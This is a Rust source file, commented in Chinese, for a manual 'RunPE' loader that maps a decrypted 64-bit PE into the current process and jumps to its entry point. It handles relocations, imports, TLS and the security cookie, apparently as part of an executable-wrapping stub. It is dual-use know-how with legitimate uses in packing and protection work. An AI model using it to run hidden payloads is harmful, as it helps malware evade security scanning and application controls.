//! RunPE 内存加载器：在当前进程内手动加载 PE 并执行。
//!
//! 核心步骤（详见 `docs/ARCHITECTURE.md §5.2`）：
//! 1. 解析 PE，校验 MZ/PE 签名
//! 2. VirtualAlloc 分配内存（按 SizeOfImage）
//! 3. 复制 PE 头与各节区
//! 4. 处理基址重定位（若实际基址 != 期望基址）
//! 5. 处理导入表：LoadLibrary + GetProcAddress 填充 IAT
//! 6. 处理 TLS 回调（如有）
//! 7. 设置各节区内存页权限
//! 8. 注册异常处理表（x64 RUNTIME_FUNCTION）
//! 9. 跳转到 OEP

use goblin::pe::PE;
use thiserror::Error;

use windows::Win32::Foundation::{HMODULE, BOOL};
use windows::Win32::System::LibraryLoader::{
    GetModuleHandleW, GetProcAddress, LoadLibraryW,
};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect,
    MEM_COMMIT, MEM_RESERVE,
    PAGE_PROTECTION_FLAGS, PAGE_READWRITE, PAGE_EXECUTE_READ,
    PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_NOACCESS,
};
use windows::core::PCWSTR;
use windows::core::{s, w};

use std::ffi::OsString;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;

/// 调试日志（临时，用于排查 RunPE 崩溃）。
fn log(msg: &str) {
    if let Ok(mut f) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(r"C:\Home\Projects\applocker\temp\stub_debug.log")
    {
        let _ = writeln!(f, "[loader] {}", msg);
        let _ = f.flush();
    }
}

/// Data directory 索引常量。
const DIR_IMPORT: usize = 1;
const DIR_EXCEPTION: usize = 3;
const DIR_BASE_RELOCATION: usize = 5;
const DIR_TLS: usize = 9;

#[derive(Debug, Error)]
pub enum LoaderError {
    #[error("PE 解析失败: {0}")]
    Parse(String),
    #[error("不是 PE 文件")]
    NotPe,
    #[error("VirtualAlloc 失败: {0}")]
    VirtualAlloc(String),
    #[error("VirtualProtect 失败: {0}")]
    VirtualProtect(String),
    #[error("节区 {0} 数据越界: raw_ptr=0x{1:x}, raw_size=0x{2:x}, file_len=0x{3:x}")]
    SectionOutOfBounds(String, u32, u32, usize),
    #[error("重定位表处理失败: {0}")]
    Relocation(String),
    #[error("导入表处理失败: DLL '{0}' 加载失败")]
    ImportDllLoadFailed(String),
    #[error("导入表处理失败: 函数 '{0}' 未找到")]
    ImportFuncNotFound(String),
    #[error("不支持 32 位 PE")]
    Unsupported32Bit,
    #[error("内部错误: {0}")]
    Internal(String),
}

// ===================== 公共入口 =====================

/// 在当前进程内加载 PE 并跳转到其入口点。
///
/// `plaintext_pe` 是解密后的完整 PE 字节。
/// 返回原 EXE 的退出码。
///
/// **注意**：原 EXE 的入口点接管控制权后，进程在原 EXE 退出时直接结束。
/// 如果原 EXE 调用 ExitProcess，整个进程（含 stub）终止。
pub fn run_pe(plaintext_pe: &[u8]) -> Result<u32, LoaderError> {
    log("run_pe: enter");
    let pe = PE::parse(plaintext_pe).map_err(|e| LoaderError::Parse(e.to_string()))?;
    log("run_pe: parsed PE");

    // 校验 64 位
    if pe.header.coff_header.machine != 0x8664 {
        return Err(LoaderError::Unsupported32Bit);
    }
    log("run_pe: 64-bit OK");

    let opt = pe
        .header
        .optional_header
        .ok_or_else(|| LoaderError::Parse("missing optional header".into()))?;

    let preferred_base = opt.windows_fields.image_base as usize;
    let image_size = opt.windows_fields.size_of_image as usize;
    let headers_size = opt.windows_fields.size_of_headers as usize;
    let entry_rva = opt.standard_fields.address_of_entry_point as usize;
    log(&format!("run_pe: preferred_base=0x{:x} image_size=0x{:x} headers_size=0x{:x} entry_rva=0x{:x}",
        preferred_base, image_size, headers_size, entry_rva));

    // 检查是否有重定位表
    let has_reloc = match get_data_directory(&pe, DIR_BASE_RELOCATION) {
        Some((va, sz)) if va != 0 && sz != 0 => true,
        _ => false,
    };
    log(&format!("run_pe: has_relocation_table={}", has_reloc));

    // 2. 分配内存：优先尝试 preferred_base，失败则任意地址
    let base = alloc_image(preferred_base, image_size)?;
    log(&format!("run_pe: base=0x{:x}", base));

    // 如果 delta != 0 但没有重定位表，大概率会崩溃
    let delta = base as i64 - preferred_base as i64;
    if delta != 0 && !has_reloc {
        log(&format!("run_pe: WARNING delta=0x{:x} but no relocation table!", delta));
    }

    // 3. 复制 PE 头
    log("run_pe: copying headers");
    unsafe {
        std::ptr::copy_nonoverlapping(
            plaintext_pe.as_ptr(),
            base as *mut u8,
            headers_size.min(plaintext_pe.len()),
        );
    }
    log("run_pe: headers copied");

    // 4. 复制各节区（先把节区名收集出来，避免借用问题）
    let section_infos: Vec<(String, u32, u32, u32, u32)> = pe
        .sections
        .iter()
        .map(|s| {
            (
                s.name().unwrap_or("?").to_string(),
                s.pointer_to_raw_data,
                s.size_of_raw_data,
                s.virtual_address,
                s.virtual_size,
            )
        })
        .collect();

    log(&format!("run_pe: copying {} sections", section_infos.len()));
    for (name, raw_ptr, raw_size, virt_addr, _virt_size) in &section_infos {
        let raw_ptr = *raw_ptr as usize;
        let raw_size = *raw_size as usize;
        let virt_addr = *virt_addr as usize;

        if raw_ptr + raw_size > plaintext_pe.len() {
            return Err(LoaderError::SectionOutOfBounds(
                name.clone(),
                raw_ptr as u32,
                raw_size as u32,
                plaintext_pe.len(),
            ));
        }

        if raw_size > 0 {
            unsafe {
                std::ptr::copy_nonoverlapping(
                    plaintext_pe.as_ptr().add(raw_ptr),
                    (base + virt_addr) as *mut u8,
                    raw_size,
                );
            }
        }
        log(&format!("  section '{}': raw=0x{:x}+0x{:x} -> virt=0x{:x}", name, raw_ptr, raw_size, virt_addr));
    }
    log("run_pe: sections copied");

    // 5. 基址重定位
    if delta != 0 {
        log(&format!("run_pe: applying relocations, delta=0x{:x}", delta));
        apply_relocations(base, &pe, delta)?;
        log("run_pe: relocations done");
    } else {
        log("run_pe: no relocations needed (delta=0)");
    }

    // 6. 修复导入表
    log("run_pe: resolving imports");
    resolve_imports(base, &pe)?;
    log("run_pe: imports resolved");

    // 7. 设置节区内存权限
    log("run_pe: setting section permissions");
    set_section_permissions_from_pe(base, &pe)?;
    log("run_pe: permissions set");

    // 8. 注册异常处理表（x64）
    log("run_pe: registering exception table");
    register_exception_table(base, &pe)?;
    log("run_pe: exception table registered");

    // 9. TLS 数据初始化（必须在 TLS 回调和 OEP 之前）
    log("run_pe: setting up TLS data");
    setup_tls_data(base, &pe)?;
    log("run_pe: TLS data set up");

    // 10. TLS 回调
    log("run_pe: running TLS callbacks");
    run_tls_callbacks(base, &pe)?;
    log("run_pe: TLS callbacks done");

    // 11. 初始化安全 Cookie（MSVC CRT 栈保护）
    log("run_pe: initializing security cookie");
    init_security_cookie(base, &pe);
    log("run_pe: security cookie initialized");

    // 12. 跳转到 OEP
    if entry_rva == 0 {
        log("run_pe: entry_rva=0, returning 0");
        return Ok(0);
    }
    let entry_point = base + entry_rva;
    log(&format!("run_pe: jumping to OEP at 0x{:x}", entry_point));

    jump_to_oep(entry_point);

    // 理论上不会到达这里（原 EXE 会调用 ExitProcess）
    log("run_pe: returned from OEP (unexpected)");
    Ok(0)
}

/// MSVC x64 安全 Cookie 的默认值。
const SECURITY_COOKIE_DEFAULT: u64 = 0x00002B992DDFA232;

/// 初始化安全 Cookie。
///
/// MSVC 编译的程序在 `.data` 段中有一个 `__security_cookie` 变量，
/// 初始值为 `0x00002B992DDFA232`。OS 加载器会在加载时写入一个随机值。
/// 手动加载时需要自己做，否则 CRT 的 `__security_init_cookie` 可能
/// 检测到异常值并触发 `__report_gsfailure`（0xC0000409）。
fn init_security_cookie(base: usize, pe: &PE) {
    // 生成一个随机 cookie 值
    let cookie = generate_security_cookie();
    log(&format!("init_security_cookie: new cookie=0x{:016x}", cookie));

    // 在 .data 段中搜索默认 cookie 值并替换
    for section in pe.sections.iter() {
        let name = section.name().unwrap_or("");
        if name != ".data" {
            continue;
        }

        let virt_addr = section.virtual_address as usize;
        let virt_size = section.virtual_size as usize;
        let data_start = base + virt_addr;

        // 按 8 字节对齐扫描
        let count = virt_size / 8;
        for i in 0..count {
            let addr = data_start + i * 8;
            let val = read_u64_raw(addr);
            if val == SECURITY_COOKIE_DEFAULT {
                log(&format!("init_security_cookie: found cookie at 0x{:x}, replacing", addr));
                write_u64_raw(addr, cookie);
            }
        }
    }
}

/// 生成一个安全 Cookie 值（非零，非默认值）。
fn generate_security_cookie() -> u64 {
    // 使用栈指针和时间戳组合，类似 MSVC 的做法
    let stack_ptr: u64 = unsafe {
        let sp: *const u8;
        std::arch::asm!(
            "mov {sp}, rsp",
            sp = out(reg) sp,
            options(nostack, preserves_flags, readonly),
        );
        sp as u64
    };
    // 用性能计数器作为时间源（不需要额外 feature）
    let mut perf_counter: i64 = 0;
    unsafe {
        windows::Win32::System::Performance::QueryPerformanceCounter(
            &mut perf_counter as *mut _,
        ).ok();
    }
    let cookie = (perf_counter as u64) ^ stack_ptr ^ 0x00002B992DDFA232;
    if cookie == 0 || cookie == SECURITY_COOKIE_DEFAULT {
        0x00002B992DDFA232 + 1
    } else {
        cookie
    }
}

// ===================== 内存分配 =====================

fn alloc_image(preferred_base: usize, image_size: usize) -> Result<usize, LoaderError> {
    // 先尝试 preferred_base
    let ptr = unsafe {
        VirtualAlloc(
            Some(preferred_base as *const _),
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    let base = if ptr.is_null() {
        // preferred_base 不可用，任意地址分配
        let ptr = unsafe {
            VirtualAlloc(
                None,
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if ptr.is_null() {
            return Err(LoaderError::VirtualAlloc("VirtualAlloc 返回 null".into()));
        }
        ptr as usize
    } else {
        ptr as usize
    };

    Ok(base)
}

// ===================== 基址重定位 =====================

fn get_data_directory(pe: &PE, index: usize) -> Option<(u32, u32)> {
    let opt = pe.header.optional_header?;
    let entry = opt.data_directories.data_directories.get(index)?;
    entry.as_ref().map(|(_, d)| (d.virtual_address, d.size))
}

fn apply_relocations(base: usize, pe: &PE, delta: i64) -> Result<(), LoaderError> {
    let (reloc_rva, reloc_size) = match get_data_directory(pe, DIR_BASE_RELOCATION) {
        Some((va, sz)) if va != 0 && sz != 0 => (va as usize, sz as usize),
        _ => return Ok(()), // 无重定位表
    };

    let reloc_end = reloc_rva + reloc_size;
    let mut offset = reloc_rva;

    while offset < reloc_end {
        let page_rva = read_u32(base, offset) as usize;
        let block_size = read_u32(base, offset + 4) as usize;
        if block_size == 0 {
            break;
        }

        let entries_count = (block_size - 8) / 2;
        for i in 0..entries_count {
            let entry = read_u16(base, offset + 8 + i * 2);
            let reloc_type = (entry >> 12) & 0xF;
            let reloc_offset = (entry & 0x0FFF) as usize;

            if reloc_type == 0 {
                continue; // ABSOLUTE，padding
            }

            let target = base + page_rva + reloc_offset;

            match reloc_type {
                10 => {
                    // IMAGE_REL_BASED_DIR64：修正 8 字节绝对地址
                    let old = read_u64_raw(target);
                    let new = (old as i64 + delta) as u64;
                    write_u64_raw(target, new);
                }
                _ => {
                    // 其他类型在 x64 上罕见，跳过
                }
            }
        }

        offset += block_size;
    }

    Ok(())
}

// ===================== 导入表修复 =====================

fn resolve_imports(base: usize, pe: &PE) -> Result<(), LoaderError> {
    let (import_rva, _import_size) = match get_data_directory(pe, DIR_IMPORT) {
        Some((va, sz)) if va != 0 && sz != 0 => (va as usize, sz as usize),
        _ => return Ok(()), // 无导入表
    };

    let mut offset = import_rva;
    loop {
        // IMAGE_IMPORT_DESCRIPTOR（20 字节）：
        // OriginalFirstThunk(4) / TimeDateStamp(4) / ForwarderChain(4) / Name(4) / FirstThunk(4)
        let original_first_thunk = read_u32(base, offset) as usize;
        let name_rva = read_u32(base, offset + 12) as usize;
        let first_thunk = read_u32(base, offset + 16) as usize;

        if name_rva == 0 && first_thunk == 0 {
            break; // 导入表结束
        }

        // 读取 DLL 名称
        let dll_name_bytes = read_cstr(base, name_rva);
        let dll_name = String::from_utf8_lossy(&dll_name_bytes).to_string();

        // 加载 DLL
        let hmodule = load_dll(&dll_name)?;

        // 遍历 thunk，解析每个函数
        let thunk_rva = if original_first_thunk != 0 {
            original_first_thunk
        } else {
            first_thunk
        };

        let mut thunk_offset = thunk_rva;
        let mut iat_offset = first_thunk;
        loop {
            let thunk_value = read_u64(base, thunk_offset);
            if thunk_value == 0 {
                break; // thunk 数组结束
            }

            let func_addr = if thunk_value & (1u64 << 63) != 0 {
                // 序号导入：低 16 位是序号
                let ordinal = (thunk_value & 0xFFFF) as u16;
                get_proc_address_by_ordinal(hmodule, ordinal, &dll_name)?
            } else {
                // 名称导入：thunk_value 是 RVA，指向 IMAGE_IMPORT_BY_NAME
                let hint_name_rva = thunk_value as usize;
                let func_name_bytes = read_cstr(base, hint_name_rva + 2); // 跳过 Hint(2)
                let func_name = String::from_utf8_lossy(&func_name_bytes).to_string();
                get_proc_address_by_name(hmodule, &func_name, &dll_name)?
            };

            // 写入 IAT
            write_u64_raw(base + iat_offset, func_addr as u64);

            thunk_offset += 8; // x64 thunk 是 8 字节
            iat_offset += 8;
        }

        offset += 20; // 下一个 IMPORT_DESCRIPTOR
    }

    Ok(())
}

// ===================== 节区权限 =====================

fn set_section_permissions_from_pe(base: usize, pe: &PE) -> Result<(), LoaderError> {
    for section in pe.sections.iter() {
        let virt_addr = section.virtual_address as usize;
        let virt_size = section.virtual_size as usize;
        if virt_size == 0 {
            continue;
        }

        let protect = characteristics_to_protection(section.characteristics);

        let addr = (base + virt_addr) as *const _;
        let mut old_protect = PAGE_PROTECTION_FLAGS::default();
        unsafe {
            VirtualProtect(addr, virt_size, protect, &mut old_protect)
                .map_err(|e| LoaderError::VirtualProtect(e.to_string()))?;
        }
    }
    Ok(())
}

fn characteristics_to_protection(chars: u32) -> PAGE_PROTECTION_FLAGS {
    let executable = chars & 0x20000000 != 0; // IMAGE_SCN_MEM_EXECUTE
    let readable = chars & 0x40000000 != 0; // IMAGE_SCN_MEM_READ
    let writable = chars & 0x80000000 != 0; // IMAGE_SCN_MEM_WRITE

    match (executable, readable, writable) {
        (true, true, true) => PAGE_EXECUTE_READWRITE,
        (true, true, false) => PAGE_EXECUTE_READ,
        (true, false, _) => PAGE_EXECUTE_READ, // 执行至少需要读
        (false, true, true) => PAGE_READWRITE,
        (false, true, false) => PAGE_READONLY,
        (false, false, _) => PAGE_NOACCESS,
    }
}

// ===================== 异常处理表 =====================

fn register_exception_table(base: usize, pe: &PE) -> Result<(), LoaderError> {
    let (exc_rva, exc_size) = match get_data_directory(pe, DIR_EXCEPTION) {
        Some((va, sz)) if va != 0 && sz != 0 => (va as usize, sz as usize),
        _ => return Ok(()),
    };

    let count = exc_size / 12; // 每个 RUNTIME_FUNCTION 12 字节
    let entries_ptr = (base + exc_rva) as *const u8;

    // RtlAddFunctionTable(FunctionEntry, Count, BaseAddress) -> BOOL
    unsafe {
        let ntdll = GetModuleHandleW(w!("ntdll.dll"))
            .map_err(|e| LoaderError::Internal(format!("GetModuleHandleW(ntdll) {}", e)))?;
        let func = GetProcAddress(ntdll, s!("RtlAddFunctionTable"));
        if let Some(rtl_add_function_table) = func {
            let func_ptr: unsafe extern "system" fn(*const u8, u32, u64) -> BOOL =
                std::mem::transmute(rtl_add_function_table);
            let _ = func_ptr(entries_ptr, count as u32, base as u64);
        }
    }

    Ok(())
}

// ===================== TLS 数据初始化 =====================

/// 为手动加载的 PE 设置 TLS（Thread-Local Storage）数据。
///
/// OS 加载器在加载带 TLS 目录的 PE 时会：
/// 1. 分配 TLS slot index，写入 `AddressOfIndex` 变量
/// 2. 为每个线程分配 TLS 数据块，复制模板数据
/// 3. 将 TLS 数据块指针存入 TEB 的 `ThreadLocalStoragePointer[index]`
///
/// 手动加载时需要自己做这些。否则 MinGW CRT（用 `__declspec(thread)`）
/// 访问 TLS 时会读到垃圾指针并崩溃。
///
/// 本实现采用简化策略（适用于单线程场景）：
/// - 复用或创建 `ThreadLocalStoragePointer` 数组
/// - 把我们的 TLS 块放入数组
/// - 把 index 写入 `AddressOfIndex`
fn setup_tls_data(base: usize, pe: &PE) -> Result<(), LoaderError> {
    let (tls_rva, _tls_size) = match get_data_directory(pe, DIR_TLS) {
        Some((va, sz)) if va != 0 && sz != 0 => (va as usize, sz as usize),
        _ => return Ok(()), // 无 TLS 目录
    };

    let tls_addr = base + tls_rva;
    // IMAGE_TLS_DIRECTORY64 布局：
    // StartAddressOfRawData(8) / EndAddressOfRawData(8) / AddressOfIndex(8)
    // AddressOfCallBacks(8) / SizeOfZeroFill(4) / Characteristics(4)
    let start_raw = read_u64_raw(tls_addr) as usize;
    let end_raw = read_u64_raw(tls_addr + 8) as usize;
    let addr_index = read_u64_raw(tls_addr + 16) as usize;
    let size_of_zero_fill = read_u32_raw(tls_addr + 32) as usize;

    log(&format!("setup_tls: start=0x{:x} end=0x{:x} index_var=0x{:x} zero_fill={}",
        start_raw, end_raw, addr_index, size_of_zero_fill));

    let template_size = end_raw.saturating_sub(start_raw);
    let block_size = template_size + size_of_zero_fill;
    if block_size == 0 {
        log("setup_tls: block_size=0, skipping");
        return Ok(());
    }

    // 1. 分配 TLS 数据块
    let tls_block = unsafe {
        VirtualAlloc(None, block_size, MEM_COMMIT, PAGE_READWRITE)
    };
    if tls_block.is_null() {
        return Err(LoaderError::VirtualAlloc("TLS block alloc failed".into()));
    }
    log(&format!("setup_tls: tls_block=0x{:x} size=0x{:x}", tls_block as usize, block_size));

    // 2. 复制模板数据（剩余部分 VirtualAlloc 已零填充）
    if template_size > 0 {
        unsafe {
            std::ptr::copy_nonoverlapping(
                start_raw as *const u8,
                tls_block as *mut u8,
                template_size,
            );
        }
    }

    // 3. 读取 TEB 的 ThreadLocalStoragePointer（TEB+0x58 on x64）
    let tls_array_ptr = get_thread_local_storage_pointer();
    log(&format!("setup_tls: ThreadLocalStoragePointer=0x{:x}", tls_array_ptr as usize));

    if tls_array_ptr.is_null() {
        // TEB 没有 TLS 数组，创建一个新的（1 个条目）
        let new_array = unsafe {
            VirtualAlloc(None, 8, MEM_COMMIT, PAGE_READWRITE) as *mut *mut u8
        };
        if new_array.is_null() {
            return Err(LoaderError::VirtualAlloc("TLS array alloc failed".into()));
        }
        unsafe { std::ptr::write(new_array, tls_block as *mut u8) };
        set_thread_local_storage_pointer(new_array);
        // TLS index = 0
        unsafe { std::ptr::write(addr_index as *mut u32, 0) };
        log("setup_tls: created new TLS array, index=0");
    } else {
        // 已有 TLS 数组（来自 stub/主模块）。
        // 简化策略：查找数组中已有的条目数，然后添加新条目。
        // 由于无法安全地知道数组大小，我们采用覆盖策略：
        // 把 TLS index 设为 0，覆盖数组第一个条目。
        // 这对 stub 是破坏性的，但我们马上跳转到目标 OEP，不会返回。
        unsafe {
            std::ptr::write(tls_array_ptr, tls_block as *mut u8);
            std::ptr::write(addr_index as *mut u32, 0);
        }
        log("setup_tls: overwrote TLS array[0], index=0");
    }

    Ok(())
}

/// 读取 TEB 的 ThreadLocalStoragePointer（x64: TEB+0x58）。
fn get_thread_local_storage_pointer() -> *mut *mut u8 {
    unsafe {
        let ptr: *mut *mut u8;
        std::arch::asm!(
            "mov {ptr}, gs:[0x58]",
            ptr = out(reg) ptr,
            options(nostack, preserves_flags, readonly),
        );
        ptr
    }
}

/// 设置 TEB 的 ThreadLocalStoragePointer。
fn set_thread_local_storage_pointer(ptr: *mut *mut u8) {
    unsafe {
        std::arch::asm!(
            "mov gs:[0x58], {ptr}",
            ptr = in(reg) ptr,
            options(nostack, preserves_flags),
        );
    }
}

/// 读取指定地址的 u32。
fn read_u32_raw(addr: usize) -> u32 {
    unsafe { std::ptr::read_volatile(addr as *const u32) }
}

// ===================== TLS 回调 =====================

fn run_tls_callbacks(base: usize, pe: &PE) -> Result<(), LoaderError> {
    let (tls_rva, _tls_size) = match get_data_directory(pe, DIR_TLS) {
        Some((va, sz)) if va != 0 && sz != 0 => (va as usize, sz as usize),
        _ => return Ok(()),
    };

    // IMAGE_TLS_DIRECTORY64（x64）：
    // StartAddressOfRawData(8) / EndAddressOfRawData(8) / AddressOfIndex(8)
    // AddressOfCallBacks(8) / SizeOfZeroFill(4) / Characteristics(4)
    let tls_addr = base + tls_rva;
    let callbacks_va = read_u64_raw(tls_addr + 24); // AddressOfCallBacks（已是 VA）
    if callbacks_va == 0 {
        return Ok(());
    }

    let callbacks_ptr = callbacks_va as usize;

    let mut idx = 0;
    loop {
        let callback = read_u64_raw(callbacks_ptr + idx * 8);
        if callback == 0 {
            break;
        }
        // 调用 TLS 回调：void callback(PVOID DllHandle, DWORD Reason, PVOID Reserved)
        // Reason = DLL_PROCESS_ATTACH = 1
        unsafe {
            let func: unsafe extern "system" fn(*const u8, u32, *const u8) =
                std::mem::transmute(callback);
            func(base as *const u8, 1, std::ptr::null());
        }
        idx += 1;
    }

    Ok(())
}

// ===================== 跳转 OEP =====================

fn jump_to_oep(entry_point: usize) {
    // 将入口点地址转为函数指针并调用。
    // 原程序退出时会调用 ExitProcess，整个进程终止，不会返回。
    unsafe {
        let func: unsafe extern "system" fn() = std::mem::transmute(entry_point);
        func();
    }
}

// ===================== 辅助函数 =====================

fn read_u16(base: usize, rva: usize) -> u16 {
    unsafe { std::ptr::read_volatile((base + rva) as *const u16) }
}

fn read_u32(base: usize, rva: usize) -> u32 {
    unsafe { std::ptr::read_volatile((base + rva) as *const u32) }
}

fn read_u64(base: usize, rva: usize) -> u64 {
    unsafe { std::ptr::read_volatile((base + rva) as *const u64) }
}

fn read_u64_raw(addr: usize) -> u64 {
    unsafe { std::ptr::read_volatile(addr as *const u64) }
}

fn write_u64_raw(addr: usize, value: u64) {
    unsafe { std::ptr::write_volatile(addr as *mut u64, value) }
}

fn read_cstr(base: usize, rva: usize) -> Vec<u8> {
    let mut result = Vec::new();
    let mut offset = rva;
    loop {
        let byte = unsafe { std::ptr::read_volatile((base + offset) as *const u8) };
        if byte == 0 {
            break;
        }
        result.push(byte);
        offset += 1;
        if result.len() > 1024 {
            break; // 防止越界
        }
    }
    result
}

fn load_dll(name: &str) -> Result<HMODULE, LoaderError> {
    let wide: Vec<u16> = OsString::from(name)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    unsafe {
        let hmodule = LoadLibraryW(PCWSTR(wide.as_ptr()))
            .map_err(|_| LoaderError::ImportDllLoadFailed(name.to_string()))?;
        Ok(hmodule)
    }
}

fn get_proc_address_by_name(
    hmodule: HMODULE,
    func_name: &str,
    dll_name: &str,
) -> Result<usize, LoaderError> {
    let name_cstr = std::ffi::CString::new(func_name)
        .map_err(|_| LoaderError::ImportFuncNotFound(func_name.to_string()))?;
    unsafe {
        let addr = GetProcAddress(hmodule, windows::core::PCSTR(name_cstr.as_ptr() as *const u8));
        addr.map(|p| p as usize)
            .ok_or_else(|| LoaderError::ImportFuncNotFound(format!("{}!{}", dll_name, func_name)))
    }
}

fn get_proc_address_by_ordinal(
    hmodule: HMODULE,
    ordinal: u16,
    dll_name: &str,
) -> Result<usize, LoaderError> {
    // GetProcAddress 的第二个参数可以是序号（低 16 位作为指针传入）
    let ordinal_ptr = ordinal as usize as *const u8;
    unsafe {
        let addr = GetProcAddress(hmodule, windows::core::PCSTR(ordinal_ptr));
        addr.map(|p| p as usize)
            .ok_or_else(|| LoaderError::ImportFuncNotFound(format!("{}!ordinal({})", dll_name, ordinal)))
    }
}
